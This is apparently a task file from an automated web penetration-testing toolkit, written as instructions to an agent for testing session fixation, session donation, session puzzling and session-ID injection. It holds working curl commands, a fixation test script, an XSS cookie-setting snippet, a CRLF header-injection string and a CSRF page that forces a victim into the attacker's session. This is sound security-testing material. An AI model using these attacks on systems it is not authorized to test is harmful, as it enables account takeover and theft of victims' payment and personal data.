@@ -1,0 +1,509 @@
+================================================================================
+TASK 63 · SESSION FIXATION & MANIPULATION
+================================================================================
+Covers testing_toolkit.txt Phase 7 Step 25 (Part 1)
+Attacks on session CREATION and ASSIGNMENT mechanisms.
+
+OBJECTIVE:
+- Exploit session fixation to hijack victim accounts
+- Abuse session donation to force victim into attacker's context
+- Exploit session puzzling to escalate privileges
+- Test session ID injection via URL, cookies, and headers
+
+================================================================================
+INPUTS
+================================================================================
+outputs/har/accounts/*_auth.json          ← Session cookies from HAR (per-account)
+outputs/har/common_data.txt               ← Auth-related endpoints from HAR
+outputs/live_base_urls.txt                ← Target hosts
+outputs/url_corpus_all_in_scope.txt       ← URL corpus (grep for login/auth paths)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/session_attacks/
+├── session_mechanisms.txt         ← Identified session handling methods
+├── fixation_vulnerable.txt        ← Session fixation vulnerabilities
+├── donation_vulnerable.txt        ← Session donation attack results
+├── puzzling_results.txt           ← Session puzzling findings
+├── injection_vectors.txt          ← Session ID injection points
+└── scan_log.txt                   ← Full execution log
+
+================================================================================
+🧠 SESSION FUNDAMENTALS - UNDERSTAND BEFORE ATTACKING 🧠
+================================================================================
+
+───────────────────────────────────────
+How Sessions Work
+───────────────────────────────────────
+1. User visits site → Server creates session ID
+2. Session ID stored: Cookie, URL parameter, or hidden field
+3. User authenticates → Session linked to user identity
+4. Subsequent requests include session ID → Server identifies user
+
+SECURE FLOW:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 1. User visits → Server creates session ID: abc123                          │
+│ 2. User logs in → Server DESTROYS abc123, creates NEW session: xyz789       │
+│ 3. xyz789 is now linked to authenticated user                               │
+│ ✓ Session regeneration prevents fixation                                    │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+VULNERABLE FLOW:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 1. Attacker visits → Gets session ID: abc123                                │
+│ 2. Attacker sends link to victim with session abc123                        │
+│ 3. Victim clicks → Uses session abc123                                      │
+│ 4. Victim logs in → Session abc123 now authenticated                        │
+│ 5. Attacker uses abc123 → Has victim's access!                              │
+│ ✗ No session regeneration = Session Fixation                                │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+───────────────────────────────────────
+Session ID Locations
+───────────────────────────────────────
+COOKIES (Most Common):
+Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure
+Set-Cookie: JSESSIONID=abc123; Path=/
+Set-Cookie: ASP.NET_SessionId=abc123
+
+URL PARAMETERS (Legacy/Vulnerable):
+https://target.com/page?PHPSESSID=abc123
+https://target.com/page;jsessionid=abc123
+
+HIDDEN FORM FIELDS:
+<input type="hidden" name="session" value="abc123">
+
+CUSTOM HEADERS:
+X-Session-Token: abc123
+Authorization: Session abc123
+
+================================================================================
+PHASE 1: SESSION MECHANISM DISCOVERY
+================================================================================
+
+───────────────────────────────────────
+1.1 Identify Session Cookies
+───────────────────────────────────────
+# Common session cookie names
+PHPSESSID          # PHP
+JSESSIONID         # Java/JSP
+ASP.NET_SessionId  # ASP.NET
+CFID/CFTOKEN       # ColdFusion
+session            # Generic
+sess               # Generic
+sid                # Session ID
+token              # Token-based
+auth_token         # Auth token
+_session           # Ruby/Rails
+connect.sid        # Express.js
+laravel_session    # Laravel
+
+# Extract from HAR
+grep -oP 'Set-Cookie:\s*[^;]+' har_file.har | sort -u
+
+# Extract cookie names
+curl -s -c - -b - "https://target.com/login" 2>/dev/null | grep -v "^#"
+
+───────────────────────────────────────
+1.2 Check Session ID in URL
+───────────────────────────────────────
+# Look for session in URL parameters
+curl -s -I "https://target.com/login" | grep -i "location"
+
+# Check if app accepts session in URL
+curl -s "https://target.com/page?PHPSESSID=test123" -c cookies.txt
+cat cookies.txt
+
+# Java-style URL rewriting
+curl -s "https://target.com/page;jsessionid=test123"
+
+───────────────────────────────────────
+1.3 Analyze Session ID Properties
+───────────────────────────────────────
+# Check session ID entropy/randomness
+# Good: 128+ bits of randomness
+# Bad: Sequential, predictable, short
+
+# Test multiple sessions, look for patterns
+for i in {1..5}; do
+    curl -s -c - "https://target.com/" 2>/dev/null | grep -oP 'PHPSESSID=[^;]+'
+    sleep 1
+done
+
+# Check session ID length
+# < 16 chars = potentially weak
+# >= 32 chars = generally secure
+
+───────────────────────────────────────
+1.4 Check Cookie Security Attributes
+───────────────────────────────────────
+curl -s -I "https://target.com/login" | grep -i "set-cookie"
+
+# LOOK FOR:
+# HttpOnly    → Present = Good (prevents XSS theft)
+# Secure      → Present = Good (HTTPS only)
+# SameSite    → Strict/Lax = Good (CSRF protection)
+# Path        → / or specific path
+# Domain      → Should be specific, not overly broad
+
+# MISSING ANY = POTENTIAL VULNERABILITY
+
+================================================================================
+PHASE 2: SESSION FIXATION ATTACKS
+================================================================================
+
+───────────────────────────────────────
+2.1 Understanding Session Fixation
+───────────────────────────────────────
+ATTACK FLOW:
+1. Attacker obtains valid session ID (visits site)
+2. Attacker tricks victim into using that session ID
+3. Victim authenticates with attacker's session ID
+4. Attacker uses same session ID → authenticated as victim
+
+PREREQUISITES:
+- App accepts session ID from URL/attacker-controlled source
+- App does NOT regenerate session ID after authentication
+- Session ID remains valid after authentication
+
+───────────────────────────────────────
+2.2 Test Session Regeneration
+───────────────────────────────────────
+# CRITICAL TEST: Does session ID change after login?
+
+# Step 1: Get pre-auth session
+curl -s -c cookies_before.txt "https://target.com/login"
+cat cookies_before.txt | grep -oP 'PHPSESSID\s+\K\S+'
+
+# Step 2: Login (capture new cookies)
+curl -s -c cookies_after.txt -b cookies_before.txt \
+    -X POST "https://target.com/login" \
+    -d "username=testuser&password=testpass"
+
+# Step 3: Compare session IDs
+echo "Before login:"
+cat cookies_before.txt | grep -i session
+echo "After login:"
+cat cookies_after.txt | grep -i session
+
+# IF SAME SESSION ID → VULNERABLE TO FIXATION!
+
+───────────────────────────────────────
+2.3 Session Fixation via URL
+───────────────────────────────────────
+# Test if session can be set via URL parameter
+
+# Step 1: Create fixation URL
+FIXED_SESSION="attacker_controlled_session_123"
+FIXATION_URL="https://target.com/login?PHPSESSID=${FIXED_SESSION}"
+
+# Step 2: Simulate victim visiting fixation URL and logging in
+curl -s -c victim_cookies.txt "${FIXATION_URL}"
+curl -s -c victim_cookies.txt -b victim_cookies.txt \
+    -X POST "https://target.com/login" \
+    -d "username=victim&password=victimpass"
+
+# Step 3: Attacker uses fixed session
+curl -s -b "PHPSESSID=${FIXED_SESSION}" "https://target.com/profile"
+
+# If attacker sees victim's profile → VULNERABLE!
+
+───────────────────────────────────────
+2.4 Session Fixation via Cookie Injection
+───────────────────────────────────────
+# If subdomain or XSS exists, attacker can set cookies
+
+# Via XSS:
+<script>document.cookie="PHPSESSID=attacker123;path=/"</script>
+
+# Via subdomain (if .target.com cookie allowed):
+# Attacker controls evil.target.com
+# Sets cookie for .target.com domain
+# Victim visits main target.com with attacker's session
+
+# Test domain scope
+curl -s -I "https://target.com/" | grep -i "set-cookie" | grep -i "domain"
+
+───────────────────────────────────────
+2.5 Session Fixation via Meta Tag
+───────────────────────────────────────
+# Some apps accept session from meta refresh
+<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker123">
+
+# Or via HTTP header injection
+%0d%0aSet-Cookie:%20PHPSESSID=attacker123
+
+───────────────────────────────────────
+2.6 Automated Fixation Test Script
+───────────────────────────────────────
+#!/bin/bash
+# session_fixation_test.sh
+
+TARGET="$1"
+LOGIN_URL="$2"
+PROFILE_URL="$3"
+USERNAME="$4"
+PASSWORD="$5"
+
+FIXED_SID="fixation_test_$(date +%s)"
+
+echo "[*] Testing Session Fixation on $TARGET"
+echo "[*] Fixed Session ID: $FIXED_SID"
+
+# Try different fixation methods
+echo "[*] Method 1: URL Parameter"
+curl -s -c /tmp/fix1.txt "${LOGIN_URL}?PHPSESSID=${FIXED_SID}" > /dev/null
+curl -s -b /tmp/fix1.txt -c /tmp/fix1.txt \
+    -X POST "$LOGIN_URL" \
+    -d "username=${USERNAME}&password=${PASSWORD}" > /dev/null
+
+# Check if fixed session works
+response=$(curl -s -b "PHPSESSID=${FIXED_SID}" "$PROFILE_URL")
+if echo "$response" | grep -qi "welcome\|profile\|dashboard\|$USERNAME"; then
+    echo "[!] VULNERABLE: Session Fixation via URL!"
+fi
+
+echo "[*] Method 2: Cookie Header"
+curl -s -H "Cookie: PHPSESSID=${FIXED_SID}" -c /tmp/fix2.txt "$LOGIN_URL" > /dev/null
+curl -s -b /tmp/fix2.txt -c /tmp/fix2.txt \
+    -X POST "$LOGIN_URL" \
+    -d "username=${USERNAME}&password=${PASSWORD}" > /dev/null
+
+response=$(curl -s -b "PHPSESSID=${FIXED_SID}" "$PROFILE_URL")
+if echo "$response" | grep -qi "welcome\|profile\|dashboard\|$USERNAME"; then
+    echo "[!] VULNERABLE: Session Fixation via Cookie Header!"
+fi
+
+================================================================================
+PHASE 3: SESSION DONATION ATTACKS
+================================================================================
+
+───────────────────────────────────────
+3.1 Understanding Session Donation
+───────────────────────────────────────
+ATTACK FLOW (Reverse of Fixation):
+1. Attacker logs into their own account
+2. Attacker captures their authenticated session ID
+3. Attacker tricks victim into using attacker's session
+4. Victim thinks they're logged in as themselves
+5. Victim performs sensitive actions (adds credit card, etc.)
+6. Attacker accesses their account → has victim's data!
+
+USE CASES:
+- Victim adds payment method → Attacker has it
+- Victim enters PII → Attacker collects it
+- Victim makes purchase → Attacker receives goods
+
+───────────────────────────────────────
+3.2 Session Donation Test
+───────────────────────────────────────
+# Step 1: Attacker logs in, gets session
+curl -s -c attacker_session.txt \
+    -X POST "https://target.com/login" \
+    -d "username=attacker&password=attackerpass"
+
+ATTACKER_SESSION=$(grep -oP 'PHPSESSID\s+\K\S+' attacker_session.txt)
+echo "[*] Attacker session: $ATTACKER_SESSION"
+
+# Step 2: Create donation link
+# https://target.com/account?PHPSESSID=$ATTACKER_SESSION
+
+# Step 3: If victim visits and adds payment info...
+# Attacker checks their account for victim's data
+
+───────────────────────────────────────
+3.3 Session Donation via CSRF
+───────────────────────────────────────
+# If app accepts session in URL and has no CSRF protection:
+
+<html>
+<body>
+<!-- Force victim to use attacker's session -->
+<img src="https://target.com/set_session?sid=ATTACKER_SESSION" style="display:none">
+<script>
+// Redirect to account page with attacker's session
+setTimeout(function() {
+    window.location = "https://target.com/account?PHPSESSID=ATTACKER_SESSION";
+}, 1000);
+</script>
+</body>
+</html>
+
+================================================================================
+PHASE 4: SESSION PUZZLING ATTACKS
+================================================================================
+
+───────────────────────────────────────
+4.1 Understanding Session Puzzling
+───────────────────────────────────────
+CONCEPT: Different application flows store variables in the same session
+- Login flow sets: session['authenticated'] = true
+- Password reset sets: session['reset_user'] = "admin"
+- If reset flow doesn't clear 'authenticated' → privilege escalation!
+
+ATTACK: Exploit session variable collisions between different flows
+
+───────────────────────────────────────
+4.2 Identify Session-Dependent Flows
+───────────────────────────────────────
+# Flows that likely use session variables:
+- Login/Authentication
+- Password Reset
+- Email Verification
+- Multi-step Wizards
+- Shopping Cart
+- Account Settings
+- Admin Functions
+
+# For each flow, track session state changes
+
+───────────────────────────────────────
+4.3 Session Puzzling Test Cases
+───────────────────────────────────────
+# TEST 1: Password Reset → Login Bypass
+# ─────────────────────────────────────
+# Hypothesis: Password reset stores user identity in session
+
+# Step 1: Start password reset for admin
+curl -s -c session.txt -X POST "https://target.com/forgot-password" \
+    -d "email=admin@target.com"
+
+# Step 2: Don't complete reset, try accessing protected page
+curl -s -b session.txt "https://target.com/admin"
+
+# If admin access granted → Session Puzzling!
+
+# TEST 2: Registration → Admin Access
+# ─────────────────────────────────────
+# Step 1: Start registration with role manipulation
+curl -s -c session.txt -X POST "https://target.com/register" \
+    -d "username=test&email=test@test.com&role=admin"
+
+# Step 2: Abandon registration, try admin endpoint
+curl -s -b session.txt "https://target.com/admin/dashboard"
+
+# TEST 3: Multi-step Flow Skip
+# ─────────────────────────────────────
+# Step 1: Complete step 1 of wizard
+curl -s -c session.txt -X POST "https://target.com/wizard/step1" \
+    -d "data=value"
+
+# Step 2: Skip to final step
+curl -s -b session.txt "https://target.com/wizard/complete"
+
+───────────────────────────────────────
+4.4 Session Variable Enumeration
+───────────────────────────────────────
+# Look for debug endpoints that expose session
+curl -s "https://target.com/debug/session"
+curl -s "https://target.com/phpinfo.php" | grep -i session
+curl -s "https://target.com/actuator/sessions"
+
+# Error messages may leak session structure
+curl -s "https://target.com/page?session[admin]=true"
+
+================================================================================
+PHASE 5: SESSION ID INJECTION
+================================================================================
+
+───────────────────────────────────────
+5.1 URL-Based Injection
+───────────────────────────────────────
+# Standard URL parameter
+https://target.com/page?PHPSESSID=injected
+https://target.com/page?session=injected
+https://target.com/page?sid=injected
+
+# Java URL rewriting
+https://target.com/page;jsessionid=injected
+
+# Path-based
+https://target.com/PHPSESSID=injected/page
+https://target.com/(S(injected))/page  # ASP.NET cookieless
+
+───────────────────────────────────────
+5.2 Header-Based Injection
+───────────────────────────────────────
+# Cookie header
+curl -H "Cookie: PHPSESSID=injected" "https://target.com/page"
+
+# Custom session headers (check app behavior)
+curl -H "X-Session-Id: injected" "https://target.com/page"
+curl -H "X-Auth-Token: injected" "https://target.com/page"
+
+───────────────────────────────────────
+5.3 POST Body Injection
+───────────────────────────────────────
+# Hidden form field
+curl -X POST "https://target.com/action" \
+    -d "action=submit&PHPSESSID=injected"
+
+# JSON body
+curl -X POST "https://target.com/api/action" \
+    -H "Content-Type: application/json" \
+    -d '{"action":"submit","session":"injected"}'
+
+───────────────────────────────────────
+5.4 Injection Priority Testing
+───────────────────────────────────────
+# Test which source takes precedence
+# Send different session IDs via different methods
+
+curl -H "Cookie: PHPSESSID=cookie_session" \
+     "https://target.com/page?PHPSESSID=url_session"
+
+# Check which session is used
+# If URL overrides Cookie → easier fixation attack
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+
+RECONNAISSANCE FIRST:
+─────────────────────
+1. Identify ALL session mechanisms (cookies, URL, headers)
+2. Note session cookie names and attributes
+3. Map authentication flow
+4. Identify multi-step processes that use sessions
+5. Check for debug endpoints exposing session data
+
+ATTACK PRIORITY:
+────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Priority │ Attack                  │ Impact                                │
+├──────────┼─────────────────────────┼───────────────────────────────────────┤
+│ 1        │ Session Fixation        │ Account takeover                      │
+│ 2        │ No Regeneration         │ Enables fixation                      │
+│ 3        │ Session Puzzling        │ Privilege escalation                  │
+│ 4        │ Session Donation        │ Data theft via social engineering    │
+│ 5        │ URL Session ID          │ Session exposure, fixation vector    │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+VERIFICATION CHECKLIST:
+───────────────────────
+□ Does session ID change after login? (If no → Fixation possible)
+□ Can session ID be set via URL? (If yes → Easy fixation)
+□ Does password reset affect session state? (Puzzling check)
+□ Are session cookies HttpOnly? (If no → XSS can steal)
+□ Are session cookies Secure? (If no → MITM can steal)
+
+================================================================================
+COMMON MISTAKES TO AVOID
+================================================================================
+❌ Not testing session regeneration after EVERY auth state change
+❌ Only testing fixation via URL, missing cookie injection
+❌ Forgetting to test session puzzling across different flows
+❌ Not checking all cookie security attributes
+❌ Missing URL rewriting patterns (;jsessionid=)
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ Session mechanism fully documented
+✓ Session regeneration tested at all auth transitions
+✓ Fixation attacks attempted via URL, cookie, header
+✓ Session puzzling tested across all multi-step flows
+✓ Session donation scenario documented if applicable
+✓ All injection vectors tested
+
